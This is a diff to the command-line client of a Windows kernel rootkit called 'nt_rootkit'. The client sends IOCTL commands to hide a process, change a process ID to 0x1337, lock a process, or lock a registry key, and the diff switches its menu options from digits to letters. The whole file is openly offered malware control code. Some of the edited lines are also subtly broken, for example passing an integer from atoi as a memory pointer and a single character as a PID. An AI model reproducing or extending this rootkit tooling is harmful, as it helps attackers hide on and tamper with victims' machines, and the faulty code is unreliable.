@@ -7,18 +7,20 @@ int main(int argc, char* argv[], char* envp[])
         BOOL status = FALSE;
         HANDLE device = INVALID_HANDLE_VALUE;
         DWORD ret_bytes = 0;
-        CHAR input_buf[128] = {0};
+        PINT input_buf[128] = {0};
         CHAR output_buf[128] = {0};
 
-        device = CreateFileW(L"\\\\.\\nt_rootkit",
+        device = CreateFileW(L"\\??\\nt_rootkit",
                 GENERIC_WRITE | GENERIC_READ | GENERIC_EXECUTE, 0, 0,
                 OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
 
         if (argc > 1) {
                 switch (*argv[1]) {
-                case 0:
-                        if (*argv[2] > 0) {
-                                RtlCopyMemory(input_buf, argv[2], 
+                case 'a':
+                        if (atoi(argv[2]) > 0) {
+                                printf("sending command to hide %d...",
+                                        atoi(argv[2]));
+                                RtlCopyMemory(input_buf, atoi(argv[2]),
                                         strlen(argv[2]));
                                 status = DeviceIoControl(
                                         device, IO_HIDE_PROC,
@@ -28,8 +30,8 @@ int main(int argc, char* argv[], char* envp[])
                                 );
                         }
                         break;
-                case 1:
-                        if (*argv[2] > 0) {
+                case 'b':
+                        if ((int)*argv[2] > 0) {
                                 RtlCopyMemory(input_buf, argv[2],
                                         strlen(argv[2]));
                                 status = DeviceIoControl(
@@ -39,8 +41,8 @@ int main(int argc, char* argv[], char* envp[])
                                         &ret_bytes, (LPOVERLAPPED)NULL);
                         }
                         break;
-                case 2:
-                        if (*argv[2] > 0) {
+                case 'c':
+                        if ((int)*argv[2] > 0) {
                                 HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS,
                                         FALSE, *argv[2]);
                                 RtlCopyMemory(input_buf, proc,
@@ -53,7 +55,7 @@ int main(int argc, char* argv[], char* envp[])
                                 CloseHandle(proc);
                         }
                         break;
-                case 3:
+                case 'd':
                         if (strlen(argv[2]) > 1) {
                                 RtlCopyMemory(input_buf, argv[2],
                                         strlen(argv[2]));
@@ -65,10 +67,10 @@ int main(int argc, char* argv[], char* envp[])
                         }
                         break;
                 case 'h':
-                        printf("\n0 [PID]\tHide a process.\n"
-                               "1 [PID]\tChange a PID to 0x1337\n"
-                               "2 [PID]\tLock a PID\n"
-                               "3 [REG_KEY]\tLock a Reg Key\n\n");
+                        printf("\na [PID]\t\tHide a process.\n"
+                               "b [PID]\t\tChange a PID to 0x1337\n"
+                               "c [PID]\t\tLock a PID\n"
+                               "d [REG_KEY]\tLock a Reg Key\n\n");
                         break;
                 }
         }
